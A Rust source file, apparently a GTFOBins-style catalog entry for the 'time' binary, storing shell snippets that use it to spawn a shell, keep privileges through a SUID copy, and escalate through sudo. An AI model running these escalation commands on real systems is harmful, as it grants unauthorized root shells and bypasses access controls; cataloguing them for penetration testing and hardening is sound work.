pub static BIN_NAME: &'static str = "time";
pub static BIN_DESC: &'static str = "Note that the shell might have its own builtin time implementation, which may behave differently than `/usr/bin/time`, hence the absolute path.";
pub static SH_CODE: &'static str = r#"
    
    /usr/bin/time /bin/sh
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which time) .

    ./time /bin/sh -p
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo /usr/bin/time /bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
